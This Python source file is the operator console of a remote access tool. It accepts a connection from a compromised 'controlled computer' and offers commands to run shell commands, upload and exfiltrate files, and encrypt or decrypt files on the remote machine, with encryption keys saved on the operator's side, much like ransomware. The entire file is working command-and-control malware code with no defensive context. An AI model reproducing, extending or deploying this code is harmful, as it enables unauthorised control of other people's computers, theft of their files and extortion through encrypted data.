# -*- coding: utf-8 -*-
import socket
import os
import sys
from string import ascii_letters, digits
SERVER_HOST = sys.argv[2]
SERVER_PORT = int(sys.argv[1])







class Shell():
    def __init__(self):
        self.conn, self.client_address = self.Get_Connection()
        self.dir_place = os.path.abspath(os.getcwd()) + "\\..\\..\\..\\..\\..\\Shell\\"
        self.hostname, self.path = self.Get_Requiered_First_Data()



    def Get_Connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen(1)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        client_socket, client_address = s.accept()
        return client_socket, client_address

    def Get_Rid_Of_End_Spaces(self, cmd):
        cnt = -1
        try:
            while cmd[cnt] == " ":
                cnt -= 1
            if (cnt == -1):
                return cmd
            #print("yes")
            return cmd[:cnt + 1]
        except:
            return ""

    def Get_Rid_Of_Start_Spaces(self, cmd):
        cnt = 0
        try:
            while (cmd[cnt] == " "):
                cnt += 1
            return cmd[cnt:]
        except:
            return ""

    def Get_Rid_Of_End_Slashes(self, cmd):
        cnt = -1
        while cmd[cnt] == "\\":
            cnt -= 1
        if (cnt == -1):
            return cmd
        print("yes")
        return cmd[:cnt + 1]

    def Nice_Path(srlf, path):
        nice_path = ""
        i = 0
        while (len(path) > i):
            flag = False
            while (len(path) > i and path[i] != "\\"):
                nice_path += path[i]
                i += 1
                flag = True
            if (flag):
                nice_path += "\\"
            i += 1
        return nice_path[:-1]


    def Get_Requiered_First_Data(self):
        d = self.conn.recv(1024).decode()
        return d.split(" ")[0], d.split(" ")[1]



    def Check_If_File_Exsists(self, command, len):
        # we need to fix the backets...
        file = command[len:]
        file = self.Get_Rid_Of_Start_Spaces(file)
        #print(file)
        file = (self.str_to_raw(file))
        if (os.path.isfile(self.path + file)):
            file = self.path + file
            return True, file
        if (os.path.isfile(file)):
            return True, file
        return False, " "



    def Exit(self, cmd):
        self.conn.send(cmd.encode())
        self.conn.close()

    def Send_Large_Data_To_Client(self, data):
        f = False
        f1 = data.read(1024)
        while f1:
            if (len(f1) < 1024):
                self.conn.send(f1 + "+".encode() * (1024 - len(f1)))
                self.conn.send("END_OF_FILE ".encode() + str((1024 - len(f1))).encode())
                f = True
                break
            self.conn.send(f1)
            f1 = data.read(1024)
        if (f == False):  # if len(data) % 0 == 1024
            self.conn.send("END_OF_FILE".encode())

    def str_to_raw(self, s):
        raw_map = {8: r'\b', 7: r'\a', 12: r'\f', 10: r'\n', 13: r'\r', 9: r'\t', 11: r'\v'}
        return r''.join(i if ord(i) > 32 else raw_map.get(ord(i), i) for i in s)

    def Handel_Upload(self, cmd):
            flag, file = self.Check_If_File_Exsists(cmd, 7)
            if (flag):
                #print(file)
                f_name = file.split("\\")[len(file.split("\\")) - 1]
                place = input('Where do you want to save the file in the controled computer? [Press D for the current working directory] ')
                if not place:
                    place = "null"
                self.conn.send(str('Upload' + "|" + place + "|" + f_name).encode())
                ans = self.conn.recv(1024).decode()
                while (ans == 'INVALID PATH'):
                    print("Invalid saving path! \ntry again")
                    place = input('Where do you want to save the file in the controled computer? [Press D for the current working directory]')
                    if not place:
                        place = "null"
                    self.conn.send(str('Upload' + "|" + place + "|" + f_name).encode())
                    ans = self.conn.recv(1024).decode()

                file_type = f_name[f_name.find("."):]
                while (ans == 'File_Exsists'):
                    file_name, flag = self.Handle_Exsisting_File(f_name, file_type)
                    if(flag == False): # I want to change his name
                        self.conn.send(file_name.encode()) # lets check if he exists
                    else:
                        self.conn.send("OVERWRITE".encode()) # I want to overwrite him
                    ans = self.conn.recv(1024).decode()

                my_file = open(file, 'rb')
                self.Send_Large_Data_To_Client(my_file)
                msg = self.conn.recv(1024).decode()
                print(msg)
                return 0
            else:
                print("We couldn't find the file!")
                return -1



    def Get_File_From_Client(self, cmd):
        file_name = self.Get_Rid_Of_Start_Spaces(cmd[9:]).split("\\")[-1]
        while True:
            path1 = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("Where do you want to save the file? ")))
            path1 = self.Get_Rid_Of_End_Spaces(self.Get_Rid_Of_Start_Spaces(path1))
            path1 = self.str_to_raw(path1)
            try:
                if (os.path.isdir(path1)):
                    break
            except:
               pass
            print("Invalid path! please enter it correctly")
        path1 = self.Get_Rid_Of_End_Spaces(path1)
        path1 = self.Get_Rid_Of_Start_Spaces(path1)
        path1 = self.str_to_raw(path1)
        file_type = file_name[file_name.find("."):]
        while (os.path.isfile(path1 + "\\" + file_name)):
            file_name, flag = self.Handle_Exsisting_File(file_name, file_type)
            if(flag):
                break

        self.conn.send("ok".encode())
        file = open(path1 + "\\" + file_name, 'wb')
        data_to_file = self.Get_Large_Data()

        file.write(data_to_file)
        print("The file has been downloaded")
        file.close()

    def Handle_Exsisting_File(self, file_name, file_type):
        flag = False
        ans = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(
            input("there is already a file with that name in this path. do you want to overwrite it? [y/n] ")))

        while ans != 'y' and ans != 'n':
            ans = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("Invalid choise choose [y/n] ")))
        if (ans == 'n'):
            file_name = self.Get_Rid_Of_Start_Spaces(
                self.Get_Rid_Of_End_Spaces(input("Please enter a new file name(without the file type): ")))
            while set(file_name).difference(ascii_letters + digits):
                print("You can't insert dots or special characters into a file name")
                file_name = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(
                    input("Please enter a new file name (without the file type): ")))
            file_name = file_name + file_type
            flag = False
        else:
            flag = True
        return file_name, flag



    def Save_Encryption_Key(self):
        self.conn.send("YES".encode())
        data = self.conn.recv(1024).decode()
        path1 = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("Where do you want to save the file? ")))
        while (path1 == "" or os.path.isdir(path1) == False):
            path1 = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("Invalid place! please enter a new path: ")))
        path1 = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(path1))
        path1 = self.str_to_raw(path1)
        file_name = "Info.txt"
        while (os.path.isfile(path1 + "\\" + file_name)):
            file_name, flag = self.Handle_Exsisting_File(file_name, '.txt')
            if(flag):
                break
        path1 = self.Get_Rid_Of_End_Slashes(path1)
        file = open(path1 + "\\" + file_name, 'w')
        file.write(data)
        file.close()
        print("The key has been saved to: " + path1 + "\\" + file_name)


    def Handel_Decryption_Request(self):
        key = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("Please enter your decryption key: ")))
        print("Please note that a decryption with invalid key can cause damage to the file..."
              "\nTherefore, it is VERY recommended to save a backup for the encrypted file in case the"
              " decryption fails(due to invalid key)")
        ans = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(input("[?] Do you want to save a backup file in the remote computer? [Y/N] ")))
        if(ans == 'Y' or ans == 'y'):
            self.conn.send(key.encode() + " Y".encode())
            bfile = self.conn.recv(1024).decode()
            print(bfile)
        else:
            self.conn.send(key.encode() + " N".encode())
        dec_file = self.conn.recv(1024).decode()
        if(dec_file == "Invalid_Encryption"):
            print("this encrypted file wasn't encrypted by us")
        else:
            print("The filed have been decrypted, and saved as: " + dec_file)

    def Get_Large_Data(self):
        final_data = b''
        while True:
            # print('receiving data...')
            data = self.conn.recv(1024)
            if ("END_OF_FILE ".encode() in data):
                if (len(data.decode().split(" ")) == 2):
                    final_data = final_data[:-(int(data.decode().split(" ")[1]))]
                break
            final_data += data
        return final_data

    def Handel_Shell(self):
        try:
            print(self.Get_Large_Data().decode())
        except:
            print("This directory includes Special characters that cannot be displayed")





    def Main_Panel(self):
        available_requests = ['encrypt', 'decrypt', 'change', 'cd', 'execute', 'timeout', 'download']
        while True:
            # get the command from prompt
            cmd = input(str(self.client_address[0] + ":" + self.hostname + ": " + self.path + " > "))
            if(cmd == ""):
                continue
            cmd = self.Get_Rid_Of_Start_Spaces(self.Get_Rid_Of_End_Spaces(cmd))
            request = cmd.split(" ")[0]
            if request == "exit":
                self.Exit(cmd)
                break

            if (len(cmd.split(" ")) < 2):
                print("Invalid params/command")
                continue

            elif (request == 'upload'):
                self.Handel_Upload(cmd)
                continue

            elif (request == 'shell'):
                self.conn.send(cmd.encode())
                self.Handel_Shell()
                continue

            elif(request in available_requests):
                self.conn.send(cmd.encode())

            else:
                print("Invalid params/command")
                continue


            result = self.conn.recv(16834).decode()


            if result.split(' ')[0] == 'PATH':
                self.path = result[5:]

            elif 'DOWNLOAD'in result:
                #file_or_dir = result.split(" ")[1]
                self.Get_File_From_Client(cmd)


            elif (result == 'encrypt'):
                print(self.conn.recv(1024).decode())
                ch = input("Do you want to save the Key as a file? [Y/N] ")
                if str(ch) == 'Y' or str(ch) == 'y':
                    self.Save_Encryption_Key()
                else:
                    self.conn.send("NO".encode())
                    print("\n")

            elif (result == 'decrypt'):
                self.Handel_Decryption_Request()

            else:
                print(result)






os.system("cls")
shell = Shell()
art_file = shell.dir_place + "art_file.txt"
f = open(art_file, "r")
ascii = "".join(f.readlines())
print(ascii)
shell.Main_Panel()






